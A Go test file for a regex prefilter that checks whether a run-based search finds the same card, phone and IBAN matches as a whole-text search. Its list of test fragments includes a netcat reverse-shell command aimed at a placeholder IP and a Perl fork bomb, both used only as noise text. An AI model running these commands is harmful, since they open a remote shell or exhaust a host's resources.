// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// SPDX-License-Identifier: Apache-2.0

package rxprefilter

import (
	"math/rand"
	"reflect"
	"regexp"
	"strings"
	"testing"
)

// windowTestFragments are the pieces of the texts the differential test
// builds: separators, word-boundary neighbours, numbers of every length,
// codes, text that is not ASCII, an invalid byte, and real matches.
var windowTestFragments = []string{
	" ", "  ", "\n", "\r\n", "\t", "-", ".", "+", "(", ")", ":", ",", "_", "x", "ab", "note", "lorem ipsum",
	"0", "7", "42", "123", "4111", "4111111111111111", "4111 1111 1111 1111", "4111-1111-1111-1111",
	"5555555555554444", "378282246310005", "3782 822463 10005", "6011111111111117", "x4111111111111111", "4111111111111111x",
	"GB82WEST12345698765432", "GB82 WEST 1234 5698 7654 32", "gb82west12345698765432",
	"555-123-4567", "(555) 123-4567", "+1 555 123 4567", "+44 20 7946 0958", "+4420794609580", "1+44207946095",
	"nc -e /bin/sh 203.0.113.9 4444", "perl -e fork while fork", "é", "K", "\xff", "é",
	"foo@example.com", "KEY", "key", "sk", "sſ",
}

// windowTestPatterns are the expressions the differential test searches: the
// shipped card, phone and IBAN rules, near variants, and expressions that must
// be searched over the whole text (an anchor, an any-character, a class that
// is not ASCII, a fold with a non-ASCII member).
var windowTestPatterns = []string{
	`\b4\d{3}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b`,
	`\b5[1-5]\d{2}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b`,
	`\b3[47]\d{2}[\s-]?\d{6}[\s-]?\d{5}\b`,
	`\b6(?:011|5\d{2})[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b`,
	`\b[A-Z]{2}\d{2}[\s]?[\dA-Z]{4}[\s]?(?:[\dA-Z]{4}[\s]?){1,7}[\dA-Z]{1,4}\b`,
	`(?:\b(?:\+1[\s.-]?)?\d{3}[\s.-]\d{3}[\s.-]\d{4}\b|\(\d{3}\)[\s.-]?\d{3}[\s.-]\d{4}\b)`,
	`(?:^|[\s:(])\+\d{1,3}(?:[\s.-]?\d){7,14}\b`,
	`\d{4}\b`,
	`\B\d{2}`,
	`(?i)\bkey\b`,
	`(?i)ks`,
	`[^a-z]{3}`,
	`^\d{4}`,
	`\d{4}$`,
	`\d.\d`,
	`\bx*\b`,
	`é\d`,
	`(?m)^\+\d`,
	`\d*`,
}

func windowTestText(seed int64, size int) string {
	rng := rand.New(rand.NewSource(seed))
	var b strings.Builder
	for b.Len() < size {
		b.WriteString(windowTestFragments[rng.Intn(len(windowTestFragments))])
		if rng.Intn(3) == 0 {
			b.WriteString("the quick brown fox jumps over the lazy dog ")
		}
	}
	return b.String()
}

// TestSearchInRunsFindsTheMatchesOfTheWholeText pins that the search of a text
// in runs of the bytes an expression names gives the matches, at the offsets
// and in the order, of the regex over the whole text, for texts of every
// separator and neighbour a match can have at the edge of a run, and that an
// expression the runs cannot serve is searched over the whole text.
func TestSearchInRunsFindsTheMatchesOfTheWholeText(t *testing.T) {
	served, inRuns, matched := 0, 0, 0
	for _, source := range windowTestPatterns {
		re := regexp.MustCompile(source)
		if windowPlanFor(re).ok {
			served++
		}
		for seed := int64(1); seed <= 6; seed++ {
			text := windowTestText(seed, WindowMinText+int(seed)*997)
			scan := NewText(text)
			if _, ok := scan.runsFor(re); ok {
				inRuns++
				matched += len(re.FindAllStringIndex(text, -1))
			}
			if got, want := scan.FindStringIndex(re), re.FindStringIndex(text); !reflect.DeepEqual(got, want) {
				t.Fatalf("%q seed %d: first match %v, whole text %v", source, seed, got, want)
			}
			if got, want := scan.FindAllStringIndex(re), re.FindAllStringIndex(text, -1); !reflect.DeepEqual(got, want) {
				t.Fatalf("%q seed %d: %d matches, whole text %d (first differing run near %v / %v)", source, seed, len(got), len(want), head(got), head(want))
			}
		}
	}
	if inRuns < 40 || matched < 1000 {
		t.Fatalf("%d searches were made in runs and held %d matches: the texts do not exercise the runs", inRuns, matched)
	}
	if served < 7 {
		t.Fatalf("only %d of the expressions are searched in runs, want the card, phone and IBAN rules", served)
	}
}

func head(locs [][]int) [][]int {
	if len(locs) > 3 {
		return locs[:3]
	}
	return locs
}

// TestSearchInRunsLeavesUnreadableExpressionsToTheWholeText pins which
// expressions are not searched in runs.
func TestSearchInRunsLeavesUnreadableExpressionsToTheWholeText(t *testing.T) {
	for source, want := range map[string]bool{
		`\b4\d{3}[\s-]?\d{4}\b`:      true,
		`(?i)\bkey\b`:                false, // k has the Kelvin sign in its fold orbit
		`(?i)\bnote\b`:               true,
		`[^a-z]{3}`:                  false, // a negated class names every byte
		`^\d{4}`:                     false, // an anchor
		`\d{4}$`:                     false,
		`\d.\d`:                      false, // an any-character
		`\d*`:                        false, // matches the empty string
		`é\d`:                        false, // not ASCII
		`\bx*\b`:                     false,
		`\pL\d`:                      false,
		`(?:^|[\s:(])\+\d{1,3}\d{7}`: false,
	} {
		if got := windowPlanFor(regexp.MustCompile(source)).ok; got != want {
			t.Errorf("%q: searched in runs = %t, want %t", source, got, want)
		}
	}
}

// TestSearchInRunsOfABenignTextReadsNoRun pins the point of the runs: a large
// text whose runs of card, phone and IBAN bytes are all shorter than any match
// has no run to read, and a match placed in the middle of it is found.
func TestSearchInRunsOfABenignTextReadsNoRun(t *testing.T) {
	re := regexp.MustCompile(`\b4\d{3}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b`)
	benign := strings.Repeat("line 12 of the notes: the quick brown fox 4111 jumps\n", WindowMinText/40)
	scan := NewText(benign)
	spans, ok := scan.runsFor(re)
	if !ok || len(spans) != 0 {
		t.Fatalf("benign text has %d runs (served=%t), want none", len(spans), ok)
	}
	if loc := scan.FindStringIndex(re); loc != nil {
		t.Fatalf("benign text matched at %v", loc)
	}
	attack := benign[:len(benign)/2] + " 4111 1111 1111 1111 " + benign[len(benign)/2:]
	loc := NewText(attack).FindStringIndex(re)
	if want := re.FindStringIndex(attack); loc == nil || !reflect.DeepEqual(loc, want) {
		t.Fatalf("attack text matched at %v, want %v", loc, want)
	}
}
